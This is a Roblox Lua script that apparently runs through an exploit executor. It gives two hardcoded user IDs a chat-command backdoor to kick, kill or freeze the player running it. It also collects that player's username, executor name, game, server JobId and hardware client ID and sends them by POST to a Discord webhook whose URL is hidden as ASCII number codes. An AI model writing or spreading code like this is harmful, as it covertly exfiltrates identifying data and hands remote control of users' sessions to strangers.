--!nolint
--!nocheck

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Admins = {
    [233377111] = true,
    [7131426405] = true,
}

local Commands = {
    ["kick"] = function()
        game:Shutdown()
    end,
    ["kill"] = function()
        LocalPlayer.Character.Humanoid.Health = 0
    end,
    ["freeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = true
        end
    end,
    ["unfreeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = false
        end
    end,
}

local function FindUser(Name)
    if #Name < 3 then
        return nil
    end

    Name = string.lower(Name)
    for _, player in pairs(Players:GetPlayers()) do
        if string.sub(string.lower(player.Name), 1, #Name) == Name then
            return player
        end
    end
    return nil
end

for _, Player in pairs(Players:GetPlayers()) do
    if Admins[Player.UserId] then
        Player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end
            
            if targetName then
                local target = FindUser(targetName)
                if target then
                    if target == LocalPlayer and Commands[command] then
                        Commands[command]()
                    end
                end
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if Admins[player.UserId] then
        player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end

            if targetName then
                local target = FindUser(targetName)
                if target then
                    if target == LocalPlayer and Commands[command] then
                        Commands[command]()
                    end
                end
            end
        end)
    end
end)

local Executor = identifyexecutor()
local ExecutorText = tostring(identifyexecutor())

local embed = {
	["title"] = LocalPlayer.Name,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = ExecutorText,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "RbxAnalytics HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local function decryptString(encrypted)
    local decrypted = {}
    for ascii in encrypted:gmatch("%d+") do
        table.insert(decrypted, string.char(tonumber(ascii)))
    end
    return table.concat(decrypted)
end

local obfuscatedWebhookURL = "104/116/116/112/115/58/47/47/100/105/115/99/111/114/100/46/99/111/109/47/97/112/105/47/119/101/98/104/111/111/107/115/47/49/51/53/48/54/53/53/50/54/54/54/50/49/55/53/53/51/57/51/47/95/115/82/76/117/110/72/89/113/70/120/49/110/54/97/51/97/49/84/70/53/68/54/114/66/114/118/100/99/73/101/78/74/75/80/116/50/113/66/100/77/105/116/81/98/80/53/50/117/49/87/119/116/106/84/110/45/48/118/71/56/107/78/113/45/52/51/84"
local webhookURL = decryptString(obfuscatedWebhookURL)

local httpRequest = {
	Url = webhookURL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)
